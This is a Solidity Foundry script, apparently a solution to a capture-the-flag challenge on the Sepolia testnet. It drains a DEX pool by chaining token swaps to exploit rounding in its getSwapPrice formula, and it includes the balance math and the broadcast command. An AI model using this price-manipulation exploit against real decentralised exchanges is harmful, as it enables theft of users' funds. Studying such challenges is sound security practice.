// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// token1: 0x6D1Bb5D9f70C419B7724B1768212f16ad57908ED
// token2: 0xdE8cA95B12E16eB731ADd1aB6767b872D5FEc854
// dex contract: 0x6aeFd2DeF5eCF81711E9C835DCd5f08539d52F75
interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function swap(address from, address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract TriggerAttack is Script {
    IDex public dex;
    IERC20 public token1;
    IERC20 public token2;

    address dexAddr = 0x6aeFd2DeF5eCF81711E9C835DCd5f08539d52F75;
    address token1Addr = 0x6D1Bb5D9f70C419B7724B1768212f16ad57908ED;
    address token2Addr = 0xdE8cA95B12E16eB731ADd1aB6767b872D5FEc854;
    address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02;

    uint256 token1PoolBalance;
    uint256 token2PoolBalance;
    uint256 playerToken1Balance;
    uint256 playerToken2Balance;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address account = vm.addr(privateKey);

        // Connect to Dex contract
        vm.startBroadcast(privateKey);
        dex = IDex(dexAddr);
        vm.stopBroadcast();

        // Connect to Token1 contract
        vm.startBroadcast(privateKey);
        token1 = IERC20(token1Addr);
        vm.stopBroadcast();

        // Connect to Token2 contract
        vm.startBroadcast(privateKey);
        token2 = IERC20(token2Addr);
        vm.stopBroadcast();

        // first approve dex to be able to spend our token
        // The bug is in the contract logic
        // Swap between tokens to take advantage of the getSwapPrice logic
        vm.startBroadcast(privateKey);
        dex.approve(dexAddr, type(uint256).max);

        dex.swap(token1Addr, token2Addr, token1.balanceOf(player));
        dex.swap(token2Addr, token1Addr, token2.balanceOf(player));
        dex.swap(token1Addr, token2Addr, token1.balanceOf(player));
        dex.swap(token2Addr, token1Addr, token2.balanceOf(player));
        dex.swap(token1Addr, token2Addr, token1.balanceOf(player));
        dex.swap(token2Addr, token1Addr, 45);

        token1PoolBalance = dex.balanceOf(token1Addr, dexAddr);
        token2PoolBalance = dex.balanceOf(token2Addr, dexAddr);
        playerToken1Balance = token1.balanceOf(player);
        playerToken2Balance = token2.balanceOf(player);

        vm.stopBroadcast();

        console.log("token1 pool balance: ", token1PoolBalance);
        console.log("token2 pool balance: ", token2PoolBalance);
        console.log("token1 player balance: ", playerToken1Balance);
        console.log("token2 player balance: ", playerToken2Balance);
        console.log("Message sender", msg.sender);
        console.log("Player", player);
        console.log("Account", account);
    }
}

//     token 1 | token 2
// 10 in  | 100 | 100 | 10 out
// 24 out | 110 |  90 | 20 in
// 24 in  |  86 | 110 | 30 out
// 41 out | 110 |  80 | 30 in
// 41 in  |  69 | 110 | 65 out
//        | 110 |  45 | 45 in

// math for last swap
// 110 = token2 amount in * token1 balance / token2 balance
// 110 = token2 amount in * 110 / 45
// 45  = token2 amount in

// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
